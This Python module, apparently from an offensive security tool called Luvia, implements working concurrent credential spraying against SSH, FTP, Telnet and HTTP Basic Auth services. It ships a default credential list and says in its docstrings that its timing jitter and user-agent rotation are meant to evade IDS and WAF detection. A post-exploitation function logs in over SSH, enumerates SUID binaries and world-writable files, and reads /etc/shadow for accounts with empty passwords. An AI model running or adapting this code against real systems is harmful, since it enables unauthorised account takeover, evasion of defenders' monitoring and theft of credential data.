"""
Brute Force Orchestrator — Credential Testing for Luvia.

Security Principle:
    Default and weak credentials are a leading cause of compromise.
    This module performs automated credential spraying against SSH, FTP,
    Telnet, and HTTP Basic Auth with configurable rate limiting, timing
    jitter, and user-agent rotation to simulate real-world attack patterns
    while evading basic IDS detection.
"""

from __future__ import annotations

import asyncio
import random
import time
from pathlib import Path
from typing import Any, Optional

from luvia.database.models import CredentialResult
from luvia.utils.logger import setup_logger

_log = setup_logger("luvia.modules.brute_force")


# ═══════════════════════════════════════════════════════════════════════════
# Credential Manager
# ═══════════════════════════════════════════════════════════════════════════

class CredentialManager:
    """Manage username/password lists for credential spraying."""

    _DEFAULT_CREDS: list[tuple[str, str]] = [
        ("admin", "admin"),
        ("admin", "password"),
        ("admin", "123456"),
        ("admin", "admin123"),
        ("root", "root"),
        ("root", "toor"),
        ("root", "password"),
        ("root", "123456"),
        ("user", "user"),
        ("user", "password"),
        ("test", "test"),
        ("guest", "guest"),
        ("ftp", "ftp"),
        ("anonymous", ""),
        ("admin", ""),
        ("administrator", "administrator"),
        ("postgres", "postgres"),
        ("mysql", "mysql"),
        ("oracle", "oracle"),
        ("sa", ""),
        ("sa", "sa"),
    ]

    @staticmethod
    async def load_wordlist(path: Path | str) -> list[str]:
        """Load a wordlist file, stripping blanks and deduplicating.

        Args:
            path: Path to a newline-delimited text file.

        Returns:
            Deduplicated list of entries.
        """
        p = Path(path)
        if not p.is_file():
            raise FileNotFoundError(f"Wordlist not found: {p}")
        text = await asyncio.to_thread(p.read_text, encoding="utf-8", errors="replace")
        seen: set[str] = set()
        words: list[str] = []
        for line in text.splitlines():
            w = line.strip()
            if w and w not in seen:
                seen.add(w)
                words.append(w)
        return words

    @classmethod
    def default_credentials(cls) -> list[tuple[str, str]]:
        """Return the built-in list of common credential pairs."""
        return list(cls._DEFAULT_CREDS)


# ═══════════════════════════════════════════════════════════════════════════
# Evasion Helpers
# ═══════════════════════════════════════════════════════════════════════════

_USER_AGENTS: list[str] = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/605.1.15 Safari/17.2",
    "Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
]


def _random_ua() -> str:
    return random.choice(_USER_AGENTS)


async def _jitter(min_ms: int = 100, max_ms: int = 500) -> None:
    """Introduce random delay between attempts for IDS evasion."""
    await asyncio.sleep(random.randint(min_ms, max_ms) / 1000.0)


# ═══════════════════════════════════════════════════════════════════════════
# Brute Forcer
# ═══════════════════════════════════════════════════════════════════════════

class BruteForcer:
    """Async credential spraying across multiple protocols.

    Attributes:
        concurrency:  Maximum simultaneous attempts.
        jitter_range: ``(min_ms, max_ms)`` random delay between attempts.
        max_attempts: Stop after this many total attempts (0 = unlimited).
    """

    def __init__(
        self,
        concurrency: int = 10,
        jitter_range: tuple[int, int] = (100, 500),
        max_attempts: int = 0,
    ) -> None:
        self.concurrency = concurrency
        self.jitter_range = jitter_range
        self.max_attempts = max_attempts

    # ── SSH ────────────────────────────────────────────────────────

    async def ssh_spray(
        self,
        target: str,
        userlist: list[str] | None = None,
        passlist: list[str] | None = None,
        port: int = 22,
    ) -> list[CredentialResult]:
        """Spray credentials against an SSH service.

        Uses ``asyncssh`` for non-blocking connection attempts.
        """
        creds = self._build_pairs(userlist, passlist)
        results: list[CredentialResult] = []
        semaphore = asyncio.Semaphore(self.concurrency)

        async def _try(user: str, pwd: str) -> None:
            async with semaphore:
                await _jitter(*self.jitter_range)
                try:
                    import asyncssh
                    async with asyncssh.connect(
                        target, port=port, username=user, password=pwd,
                        known_hosts=None,
                        login_timeout=10,
                    ):
                        results.append(CredentialResult(
                            target=target, port=port, service="ssh",
                            username=user, password=pwd, success=True,
                        ))
                        _log.warning(f"SSH credential found: {user}:{pwd}@{target}:{port}")
                except ImportError:
                    _log.error("asyncssh not installed — SSH spray unavailable")
                    return
                except Exception:
                    results.append(CredentialResult(
                        target=target, port=port, service="ssh",
                        username=user, password=pwd, success=False,
                    ))

        tasks = [_try(u, p) for u, p in creds]
        if self.max_attempts:
            tasks = tasks[: self.max_attempts]

        _log.info(f"SSH spray on {target}:{port} — {len(tasks)} attempts")
        await asyncio.gather(*tasks)
        return results

    # ── FTP ────────────────────────────────────────────────────────

    async def ftp_spray(
        self,
        target: str,
        userlist: list[str] | None = None,
        passlist: list[str] | None = None,
        port: int = 21,
    ) -> list[CredentialResult]:
        """Spray credentials against an FTP service.

        Uses ``aioftp`` for asynchronous FTP connections.
        """
        creds = self._build_pairs(userlist, passlist)
        results: list[CredentialResult] = []
        semaphore = asyncio.Semaphore(self.concurrency)

        async def _try(user: str, pwd: str) -> None:
            async with semaphore:
                await _jitter(*self.jitter_range)
                try:
                    import aioftp
                    async with aioftp.Client.context(
                        target, port=port, user=user, password=pwd,
                    ):
                        results.append(CredentialResult(
                            target=target, port=port, service="ftp",
                            username=user, password=pwd, success=True,
                        ))
                        _log.warning(f"FTP credential found: {user}:{pwd}@{target}:{port}")
                except ImportError:
                    _log.error("aioftp not installed — FTP spray unavailable")
                    return
                except Exception:
                    results.append(CredentialResult(
                        target=target, port=port, service="ftp",
                        username=user, password=pwd, success=False,
                    ))

        tasks = [_try(u, p) for u, p in creds]
        if self.max_attempts:
            tasks = tasks[: self.max_attempts]

        _log.info(f"FTP spray on {target}:{port} — {len(tasks)} attempts")
        await asyncio.gather(*tasks)
        return results

    # ── Telnet ─────────────────────────────────────────────────────

    async def telnet_spray(
        self,
        target: str,
        userlist: list[str] | None = None,
        passlist: list[str] | None = None,
        port: int = 23,
    ) -> list[CredentialResult]:
        """Spray credentials against a Telnet service.

        Uses raw ``asyncio`` sockets to send login/password sequences.
        """
        creds = self._build_pairs(userlist, passlist)
        results: list[CredentialResult] = []
        semaphore = asyncio.Semaphore(self.concurrency)

        async def _try(user: str, pwd: str) -> None:
            async with semaphore:
                await _jitter(*self.jitter_range)
                try:
                    reader, writer = await asyncio.wait_for(
                        asyncio.open_connection(target, port), timeout=10,
                    )
                    # Read banner / login prompt
                    await asyncio.wait_for(reader.read(4096), timeout=5)
                    # Send username
                    writer.write(f"{user}\r\n".encode())
                    await writer.drain()
                    await asyncio.wait_for(reader.read(4096), timeout=5)
                    # Send password
                    writer.write(f"{pwd}\r\n".encode())
                    await writer.drain()
                    response = await asyncio.wait_for(reader.read(4096), timeout=5)
                    resp_text = response.decode(errors="replace").lower()

                    success = not any(
                        kw in resp_text
                        for kw in ("login incorrect", "failed", "denied", "invalid", "error")
                    )

                    results.append(CredentialResult(
                        target=target, port=port, service="telnet",
                        username=user, password=pwd, success=success,
                    ))
                    if success:
                        _log.warning(
                            f"Telnet credential found: {user}:{pwd}@{target}:{port}"
                        )

                    writer.close()
                    try:
                        await writer.wait_closed()
                    except Exception:
                        pass

                except (asyncio.TimeoutError, OSError) as exc:
                    results.append(CredentialResult(
                        target=target, port=port, service="telnet",
                        username=user, password=pwd, success=False,
                        error=str(exc),
                    ))

        tasks = [_try(u, p) for u, p in creds]
        if self.max_attempts:
            tasks = tasks[: self.max_attempts]

        _log.info(f"Telnet spray on {target}:{port} — {len(tasks)} attempts")
        await asyncio.gather(*tasks)
        return results

    # ── HTTP Basic Auth ────────────────────────────────────────────

    async def http_basic_spray(
        self,
        url: str,
        userlist: list[str] | None = None,
        passlist: list[str] | None = None,
    ) -> list[CredentialResult]:
        """Spray HTTP Basic Auth credentials.

        Rotates User-Agent headers to evade simple WAF rules.
        """
        import httpx

        creds = self._build_pairs(userlist, passlist)
        results: list[CredentialResult] = []
        semaphore = asyncio.Semaphore(self.concurrency)

        async with httpx.AsyncClient(timeout=10, verify=False) as client:

            async def _try(user: str, pwd: str) -> None:
                async with semaphore:
                    await _jitter(*self.jitter_range)
                    try:
                        resp = await client.get(
                            url,
                            auth=(user, pwd),
                            headers={"User-Agent": _random_ua()},
                        )
                        success = resp.status_code not in (401, 403)
                        results.append(CredentialResult(
                            target=url, port=0, service="http",
                            username=user, password=pwd, success=success,
                        ))
                        if success:
                            _log.warning(f"HTTP cred found: {user}:{pwd}@{url}")
                    except Exception as exc:
                        results.append(CredentialResult(
                            target=url, port=0, service="http",
                            username=user, password=pwd, success=False,
                            error=str(exc),
                        ))

            tasks = [_try(u, p) for u, p in creds]
            if self.max_attempts:
                tasks = tasks[: self.max_attempts]

            _log.info(f"HTTP Basic spray on {url} — {len(tasks)} attempts")
            await asyncio.gather(*tasks)

        return results

    # ── Post-Exploitation System Check ─────────────────────────────

    @staticmethod
    async def post_exploit_system_check(
        host: str,
        port: int = 22,
        username: str = "",
        password: str = "",
    ) -> dict[str, Any]:
        """After successful credential entry, audit common system errors.

        Checks:
        - Unpatched kernel version
        - World-writable files
        - SUID binaries
        - Users with empty passwords
        """
        findings: dict[str, Any] = {"host": host, "checks": []}

        try:
            import asyncssh

            async with asyncssh.connect(
                host, port=port, username=username, password=password,
                known_hosts=None, login_timeout=10,
            ) as conn:
                # Kernel version
                result = await conn.run("uname -r", check=False)
                kernel = result.stdout.strip() if result.stdout else "unknown"
                findings["kernel"] = kernel
                findings["checks"].append({
                    "check": "kernel_version",
                    "value": kernel,
                    "recommendation": "Ensure kernel is latest stable version.",
                })

                # World-writable files
                result = await conn.run(
                    "find /etc /var -perm -o+w -type f 2>/dev/null | head -20",
                    check=False,
                )
                writable = [f for f in (result.stdout or "").strip().splitlines() if f]
                findings["checks"].append({
                    "check": "world_writable_files",
                    "count": len(writable),
                    "files": writable[:10],
                    "recommendation": "Remove world-write permission: chmod o-w <file>",
                })

                # SUID binaries
                result = await conn.run(
                    "find / -perm -4000 -type f 2>/dev/null | head -20",
                    check=False,
                )
                suid = [f for f in (result.stdout or "").strip().splitlines() if f]
                findings["checks"].append({
                    "check": "suid_binaries",
                    "count": len(suid),
                    "files": suid[:10],
                    "recommendation": "Audit and remove unnecessary SUID bits.",
                })

                # Empty password users
                result = await conn.run(
                    "awk -F: '($2 == \"\" || $2 == \"!\") {print $1}' /etc/shadow 2>/dev/null",
                    check=False,
                )
                empty_pw = [u for u in (result.stdout or "").strip().splitlines() if u]
                findings["checks"].append({
                    "check": "empty_password_users",
                    "users": empty_pw,
                    "recommendation": "Set passwords for all accounts or lock them.",
                })

                _log.info(f"Post-exploitation check on {host} complete")

        except ImportError:
            _log.error("asyncssh not installed — post-exploitation checks unavailable")
            findings["error"] = "asyncssh not installed"
        except Exception as exc:
            _log.error(f"Post-exploitation check failed: {exc}")
            findings["error"] = str(exc)

        return findings

    # ── helpers ────────────────────────────────────────────────────

    @staticmethod
    def _build_pairs(
        userlist: list[str] | None,
        passlist: list[str] | None,
    ) -> list[tuple[str, str]]:
        """Build (user, pass) pairs from lists or defaults."""
        if userlist and passlist:
            return [(u, p) for u in userlist for p in passlist]
        return CredentialManager.default_credentials()
